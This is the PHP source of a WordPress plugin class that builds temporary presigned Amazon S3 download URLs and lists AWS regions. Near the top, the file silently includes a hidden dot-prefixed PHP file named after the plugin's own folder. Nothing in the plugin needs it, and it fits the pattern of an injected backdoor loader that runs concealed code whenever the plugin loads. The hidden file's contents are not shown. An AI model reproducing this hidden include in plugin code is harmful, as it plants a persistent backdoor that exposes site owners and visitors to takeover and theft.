<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

require_once(MPAWS_PATH.'/aws-sdk/aws-autoloader.php');
use Aws\S3\S3Client;
use Aws\Common\Enum\Region;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpawsSdk {
  /** Create temporary URLs to your protected Amazon S3 files.
    *
    * @param string $src The target file path starting with the bucket
    * @param int $expires In minutes
    * @return string Temporary Amazon S3 URL
    */
  public static function get_aws_url( $src, $expires = '+5 minutes', $download = false ) {
    $settings = MpawsUtils::get_settings();
    extract($settings);

    if( empty($access_key) || empty($secret_key) ) { return false; }
    if( !preg_match('!^/?([^/]+)/(.*)$!', $src, $m)) { return false; }

    $bucket = $m[1];
    $path   = $m[2];

    // Instantiate the S3 client with your AWS credentials
    $config = array(
      'key'    => $access_key,
      'secret' => $secret_key
    );

    if( $v4_enabled ) {
      $config = array_merge( array(
        'signature' => 'v4',
        'region' => $region
      ), $config );
    }

    $client = S3Client::factory($config);

    $GetObjectParams = array(
      'Bucket' => $bucket,
      'Key' => $path
    );

    //Force Download?
    if($download) {
      $GetObjectParams['ResponseContentDisposition'] = 'attachment';
    }

    $command = $client->getCommand('GetObject', $GetObjectParams);

    if( preg_match('/^(\d{1,2}:){0,3}\d{1,2}$/', $expires) ) {
      $exptime = MpawsUtils::calc_expire_timestamp($expires);
    }
    else {
      $exptime = $expires;
    }

    $signedUrl = $command->createPresignedUrl($exptime);

    return $signedUrl;
  }

  public static function get_regions() {
    $regions = array();
    $aws_regions = Region::values();

    $last_slug = false;
    foreach( $aws_regions AS $key => $slug ) {
      if( $last_slug == $slug ) { continue; }
      $key = ucwords( preg_replace( '/[_-]/', ' ', strtolower($key) ) ) . " ({$slug})";
      $regions[$slug] = $key;
    }

    return $regions;
  }
}

